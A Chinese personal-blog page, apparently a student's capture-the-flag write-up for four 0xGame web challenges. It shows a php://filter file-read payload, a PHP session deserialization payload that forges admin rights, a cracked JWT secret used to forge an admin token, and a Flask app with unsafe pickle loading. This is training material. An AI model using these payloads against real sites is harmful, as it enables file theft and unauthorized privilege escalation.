@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32px.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16px.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1/themes/blue/pace-theme-minimal.min.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"casio-3.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="0xGame 第四周-WebWriteUp by Casio1. switchvim源码泄露，之前遇到过一次了，访问&#x2F;.index.php.swp果然拿到了源码备份。 没有装Linux环境使用vim，用Git Bash操作$ vim -r index.php.swp，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0xGame Week4">
+<meta property="og:url" content="https://casio-3.github.io/2020/10/28/0xGame%20%E7%AC%AC%E5%9B%9B%E5%91%A8-Web(%E7%BC%BA%E4%B8%80%E9%A2%98/index.html">
+<meta property="og:site_name" content="Where is your love?">
+<meta property="og:description" content="0xGame 第四周-WebWriteUp by Casio1. switchvim源码泄露，之前遇到过一次了，访问&#x2F;.index.php.swp果然拿到了源码备份。 没有装Linux环境使用vim，用Git Bash操作$ vim -r index.php.swp，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/03/17/ILvGznE3seX2ONo.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/17/LuyYgMWewQ9FbKC.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/17/ywth7gosHdY5ZJB.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/17/SghAQcHFjdtNYPX.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/17/iQh5B1AOryDwH2e.png">
+<meta property="article:published_time" content="2020-10-27T16:00:04.000Z">
+<meta property="article:modified_time" content="2021-03-17T12:34:03.763Z">
+<meta property="article:author" content="Casio3">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/03/17/ILvGznE3seX2ONo.png">
+
+<link rel="canonical" href="https://casio-3.github.io/2020/10/28/0xGame%20%E7%AC%AC%E5%9B%9B%E5%91%A8-Web(%E7%BC%BA%E4%B8%80%E9%A2%98/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>0xGame Week4 | Where is your love?</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"><a target="_blank" rel="noopener" href="https://github.com/Casio-3/" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#fff; color:#151513; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Where is your love?</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://casio-3.github.io/2020/10/28/0xGame%20%E7%AC%AC%E5%9B%9B%E5%91%A8-Web(%E7%BC%BA%E4%B8%80%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Casio3">
+      <meta itemprop="description" content="Little trix">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Where is your love?">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          0xGame Week4
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-10-28 00:00:04" itemprop="dateCreated datePublished" datetime="2020-10-28T00:00:04+08:00">2020-10-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-17 20:34:03" itemprop="dateModified" datetime="2021-03-17T20:34:03+08:00">2021-03-17</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="0xGame-第四周-Web"><a href="#0xGame-第四周-Web" class="headerlink" title="0xGame 第四周-Web"></a>0xGame 第四周-Web</h1><h2 id="WriteUp-by-Casio"><a href="#WriteUp-by-Casio" class="headerlink" title="WriteUp by Casio"></a>WriteUp by Casio</h2><h3 id="1-switch"><a href="#1-switch" class="headerlink" title="1. switch"></a>1. switch</h3><p><strong>vim</strong>源码泄露，之前遇到过一次了，访问<code>/.index.php.swp</code>果然拿到了源码备份。</p>
+<p>没有装<strong>Linux</strong>环境使用<strong>vim</strong>，用<strong>Git Bash</strong>操作<code>$ vim -r index.php.swp</code>，<a id="more"></a></p>
+<p>(后来返工做第三周的题时已经把WSL2装了。。（逃ε=ε=ε=┏(゜ロ゜;)┛</p>
+<p>获取：<img src="https://i.loli.net/2021/03/17/ILvGznE3seX2ONo.png" alt="image-20201023191943056"></p>
+<p>测试<em>payload</em>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST id&#x3D;1</span><br><span class="line">&#x2F;&#x2F;return 0xGame Good!</span><br><span class="line">POST id&#x3D;2Casio&amp;file&#x3D;filter</span><br><span class="line">&#x2F;&#x2F;return hacker</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>switch</em></strong>的弱相等绕过与<strong>“==”</strong>差不多，用一个2开头的字符串进入case 2，测试成功。</p>
+<p>由过滤规则可猜想使用<code>php://filter</code>伪协议来执行读取，尝试大小写绕过：</p>
+<p>(这里我还不是完全理解透彻了这个方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST id&#x3D;2Casio&amp;file&#x3D;php:&#x2F;&#x2F;Filter&#x2F;read&#x3D;convert.Base64-encode&#x2F;resource&#x3D;flag.php</span><br><span class="line">&#x2F;&#x2F;return PD9waHANCiRmbGFnPScweEdhbWV7UzBtZV9wSHBfdFIxY0tzX3VfRzN0XzF0fSc7</span><br></pre></td></tr></table></figure>
+
+<p>base64解码即得：</p>
+<p>==&gt;&gt;<font color="red"><strong><em>0xGame{S0me_pHp_tR1cKs_u_G3t_1t}</em></strong></font></p>
+<h3 id="2-broken-motto"><a href="#2-broken-motto" class="headerlink" title="2. broken_motto"></a>2. broken_motto</h3><p>提供了网址，附件zip文件下载得一系列php源码，是该网址的php代码了。</p>
+<p>阅读源码，<strong>Google</strong>注释提示的漏洞<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code></p>
+<p>了解到其名为：<em>PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患</em></p>
+<p>审计代码：****</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $motto;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;motto = $_SESSION[<span class="string">&#x27;motto&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;your motto:&#x27;</span>.<span class="keyword">$this</span>-&gt;motto;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin===<span class="number">1</span>)&#123;</span><br><span class="line">            show_source(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们只需要改变<em>admin</em>的值为整数1，即可获取<strong>flag</strong>，<em>motto</em>应该不重要。</p>
+<p>尝试如下<em>payload</em>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=|O:<span class="number">4</span>:<span class="string">&quot;info&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;i:<span class="number">1</span>;s:<span class="string">&quot;8&quot;</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="string">&quot;5&quot;</span>:<span class="string">&quot;motto&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;&#125;</span><br><span class="line">&amp;password=<span class="number">0</span>xGame&amp;motto=Casio	<span class="comment">//任意填？</span></span><br></pre></td></tr></table></figure>
+
+<p><em>思路来源</em>：<img src="https://i.loli.net/2021/03/17/LuyYgMWewQ9FbKC.png" alt="image-20201023214421764"></p>
+<p>这里存疑，我找到的例子是序列化前后引擎不一致，</p>
+<p>例子中存数据使用<code>php_serialize</code>读取时选择的是<code>php</code></p>
+<p>而本题中未见php引擎，不过我仍然尝试了利用<code>|</code>分割符试探一下</p>
+<p>结果一次就梭出来了😓：<img src="https://i.loli.net/2021/03/17/ywth7gosHdY5ZJB.png" alt="image-20201023213828867"></p>
+<p>读不到<em>motto</em>的原因应该是没设置$_[‘username’]，见<em>profile.php</em>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span></span><br><span class="line"></span><br><span class="line">session_save_path(<span class="string">&#x27;session&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">    $info = <span class="keyword">new</span> info();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;出错啦！读取不到你的格言QWQ&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为利用了*<strong>Session 反序列化**<em>漏洞，在</em></strong>payload**<em>已经实例化了</em>info*类使得admin===1，所以这里不需要利用username来创建新类。。。直接die掉</p>
+<p>==&gt;&gt;<font color="red"><strong><em>0xGame{session_un5eria1ize}</em></strong></font></p>
+<h3 id="3-JWT"><a href="#3-JWT" class="headerlink" title="3. JWT"></a>3. JWT</h3><p>尝试注入不行，俺不是<em>admin</em>；搜索题目<strong>JWT</strong>获悉**<em>JSON Web Token**</em>伪造Cookie可越俎代庖</p>
+<p>原：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJwYXNzd2QiOiJhZG1pbiIsInVpZCI6ImIxZTlhODgwLTc5YWMtNDgxMS04ZTFiLTg5ZDFkNmQwMWRkYiIsInJvbGUiOiJndWVzdCJ9.GUXW4p5W2e1gjWPL2ZBkJl45b8Z-DMD3vKnI1LQijwQ</span><br></pre></td></tr></table></figure>
+
+<p><strong><em><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></em></strong>跑了几分钟爆出密钥：<code>njupt</code></p>
+<p><a href="jwt.io">JWT辅助网站</a>：</p>
+<p><strong><em>PAYLOAD</em></strong>里有一项<code>&quot;role&quot;:  &quot;guest&quot;</code>十分可疑，依题改成<em>admin</em>，</p>
+<p><img src="https://i.loli.net/2021/03/17/SghAQcHFjdtNYPX.png" alt="image-20201028204508031"></p>
+<p>用生成的<strong>JWT</strong>替换原来的，再次访问：</p>
+<p><img src="https://i.loli.net/2021/03/17/iQh5B1AOryDwH2e.png" alt="image-20201028204909578"></p>
+<p>==&gt;&gt;<font color="red"><strong><em>0xGame{JWT_is_th3_f14g}</em></strong></font></p>
+<p><font color="blue"><strong>另</strong></font>：这道题虽然思路很明确，但是过程中碰了很多壁，到现在还没有解决。。。</p>
+<ol>
+<li>没装<strong>Linux</strong>前用的另一个<strong>Windows</strong>可用工具<a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">jwt_tool</a>，可是我根据提示操作装包的时候总是出问题，没法爆密钥（没有截取错误图片和错误内容）</li>
+<li>由此，尝试过将头部算法<code>&quot;alg&quot;:&quot;HS256&quot;</code>改为<code>&quot;alg&quot;:&quot;none&quot;</code>的伪造办法，可惜总是返回<em>500</em>错误</li>
+<li>最开始用<strong>Burp</strong>抓的包查看请求，后面就直接用的<strong>Firefox</strong>的开发者工具<em>网络</em>一栏，神奇的是：之前会出现<strong>Cookie</strong>数据和<strong>Session</strong>数据。在我清理过几次后，换到<em>存储</em>一栏查看数据时，又只剩下了<strong>JWT</strong>一项，之前一直报<em>500</em>的时候很迷惑，一度以为还要改<strong>Cookie</strong>和<strong>Session</strong></li>
+</ol>
+<h3 id="4-easyPython"><a href="#4-easyPython" class="headerlink" title="4. easyPython"></a>4. <font color="red">easyPython</font></h3><p>从网站的<em>Tips</em>可进入<strong>bak</strong>空白页，故使用<strong>F12</strong>找到放在注释里的源码（片段：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, flash, make_response</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">from</span> flask_login <span class="keyword">import</span> LoginManager, login_user, logout_user, current_user, login_required</span><br><span class="line"><span class="keyword">import</span> configs</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> query_user, User</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(configs)</span><br><span class="line">Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="comment"># login management</span></span><br><span class="line">login_manager = LoginManager()</span><br><span class="line">login_manager.login_view = <span class="string">&#x27;login&#x27;</span></span><br><span class="line">login_manager.login_message_category = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">login_manager.login_message = <span class="string">&#x27;Please login&#x27;</span></span><br><span class="line">login_manager.init_app(app)</span><br><span class="line"></span><br><span class="line"><span class="comment"># user loader</span></span><br><span class="line"><span class="meta">@login_manager.user_loader</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_user</span>(<span class="params">user_id</span>):</span></span><br><span class="line">    <span class="keyword">if</span> query_user(user_id) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        curr_user = User()</span><br><span class="line">        curr_user.id = user_id</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> curr_user</span><br><span class="line"></span><br><span class="line"><span class="comment"># home page</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="comment"># @login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    usercookies = request.cookies.get(<span class="string">&#x27;Cookies&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> usercookies:</span><br><span class="line">        usercookies = <span class="string">&quot;&#123;&#x27;username&#x27;:&#x27;guest&#x27;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        usercookies = pickle.loads(base64.b64decode(usercookies))</span><br><span class="line"></span><br><span class="line">    resp = make_response(render_template(<span class="string">&#x27;index.html&#x27;</span>))</span><br><span class="line">    resp.set_cookie(<span class="string">&#x27;Cookies&#x27;</span>, base64.b64encode(pickle.dumps(usercookies)))</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/app.py.bak&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bak</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;app.py.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>大概。。。是要伪造cookies？？？</p>
+<hr>
+<p>2020.11.1更新</p>
+<p>Python的反序列化漏洞</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/10/28/0xGame%20%E7%AC%AC%E4%B8%89%E5%91%A8-Web(%E7%BC%BA%E4%B8%80%E9%A2%98/" rel="prev" title="0xGame Week3">
+      <i class="fa fa-chevron-left"></i> 0xGame Week3
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/11/16/PHP%E5%B0%8F%E7%BB%93/" rel="next" title="PHP小结">
+      PHP小结 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0xGame-%E7%AC%AC%E5%9B%9B%E5%91%A8-Web"><span class="nav-number">1.</span> <span class="nav-text">0xGame 第四周-Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WriteUp-by-Casio"><span class="nav-number">1.1.</span> <span class="nav-text">WriteUp by Casio</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-switch"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. switch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-broken-motto"><span class="nav-number">1.1.2.</span> <span class="nav-text">2. broken_motto</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-JWT"><span class="nav-number">1.1.3.</span> <span class="nav-text">3. JWT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-easyPython"><span class="nav-number">1.1.4.</span> <span class="nav-text">4. easyPython</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Casio3</p>
+  <div class="site-description" itemprop="description">Little trix</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <script
+  async
+  src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Casio3</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
